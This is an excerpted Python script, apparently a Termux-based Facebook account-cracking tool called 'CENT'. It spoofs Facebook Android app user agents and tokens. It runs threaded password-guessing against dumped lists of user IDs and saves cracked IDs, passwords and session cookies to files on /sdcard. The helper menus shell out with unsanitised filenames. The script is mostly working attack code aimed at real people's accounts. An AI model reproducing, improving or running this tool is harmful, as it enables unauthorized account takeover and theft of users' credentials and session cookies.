...
while attemps < 12345677901:
    username = input(' \033[97;1mEnter Username: ')
    password = input(' \033[97;1mEnter Password: ')

    if username == 'geoutog' and password == '081904':
...
from concurrent.futures import ThreadPoolExecutor as sarfrazCENT
from string import * 
...
def randBuildLSB():
    ...
    END = '[FBAN/FB4A;FBAV/94.0.0.6865;FBBV/1725619;[FBAN/FB4A;FBAV/56.0.0.30.88;FBBV/549753668;FBDM/{density=2.6,width=1080,height=2340};FBLC/ar_SD;FBRV/563978114;FB_FW/2;FBCR/Vodafone Germany;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/F17 Pro;FBSV/8.0;FBOP/19;FBCA/armeabi-v7a;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/97.0.0.7549;FBBV/6131481[FBAN/FB4A;FBAV/58.0.0.12.77;FBBV/537788408;FBDM/{density=2.5,width=1080,height=1920};FBLC/es_PA;FBRV/570251911;FBCR/Tunisie Telecom;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A52;FBSV/8.1;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[CENT] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/CENT_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/CENT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[CENT] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    os.system('espeak -a 300 "HEY, SHIT, YOU,  GOT,  A,  FUCK,  id"')
                    oks.append(sid)
                    open('/sdcard/CENT_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazCENT(max_workers=30) as CENTworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/CENT.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/CENT.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    CENT = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+CENT+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + CENT )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back CENT Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/CENT.txt\n') 
        filepath = input("Put File Name: ")
